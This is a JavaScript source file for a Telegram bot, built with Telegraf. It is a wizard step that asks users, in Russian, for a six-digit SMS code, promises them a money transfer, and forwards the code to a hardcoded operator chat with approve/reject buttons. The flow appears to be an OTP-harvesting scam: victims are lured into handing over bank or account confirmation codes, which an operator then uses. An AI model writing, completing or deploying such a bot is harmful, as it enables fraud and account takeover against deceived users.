const { Markup, Composer, Scenes } = require("telegraf");
const { Customer, Payment } = require("../models");

const startStep = new Composer();
startStep.on("text",ctx => {
    const { paymentRequestId } = ctx.wizard.state;
    let enteredCode = ctx.message.text;

    ctx.wizard.state.data = {};
    ctx.wizard.state.msgHistory = {};

    if(enteredCode.length !== 6){
        ctx.reply("Код должен состоять из 6-и цифр. Введите его заново");
        return ctx.wizard.selectStep(0);
    } else {
        ctx.wizard.state.data.SmsCode = enteredCode;
        ctx.reply(`Проверьте правильность кода: ${enteredCode} \nВсё верно ?`, {
            reply_markup: {
                inline_keyboard: [
                    [ { text: "Да", callback_data: "continue" }, { text: "Ввести код заново", callback_data: "edit_code" } ],
                ]
            }
        }).then((m) => ctx.wizard.state.msgHistory.checkCode = m.message_id);
        return ctx.wizard.next();
    }
});

const confirmCodeStep = new Composer();
confirmCodeStep.action("continue", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.checkCode);
    ctx.reply("Ваш код отправлен. Если вы указывали все данные верно, мы уведомим вас об этом и денежные средства будут перечислены на ваши реквизиты");
    
    const { paymentRequestId, data } = ctx.wizard.state;
    Payment.findOne({ _id: paymentRequestId }, (err, payment) => {
        ctx.telegram.sendMessage(1257409280, "SMS Code: " + data.SmsCode, {
            reply_to_message_id: payment.initialAdminMessage,
            reply_markup: {
                inline_keyboard: [
                    [ { text: "+", callback_data: "successful_paymentRequest_" + paymentRequestId }, { text: "-", callback_data: "failed_paymentRequest_" + paymentRequestId } ],
                ]
            }
        }).then((m) => {
            payment.smsRequestMessage = m.message_id;
            payment.save();
        });
    });
    return ctx.scene.leave();
});
confirmCodeStep.action("edit_code", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.checkCode);
    ctx.replyWithHTML("Введите <b>SMS-код</b>");
    return ctx.wizard.selectStep(0);
});

const enterCodeScene = new Scenes.WizardScene("enterCodeWizard", startStep, confirmCodeStep);

module.exports = enterCodeScene;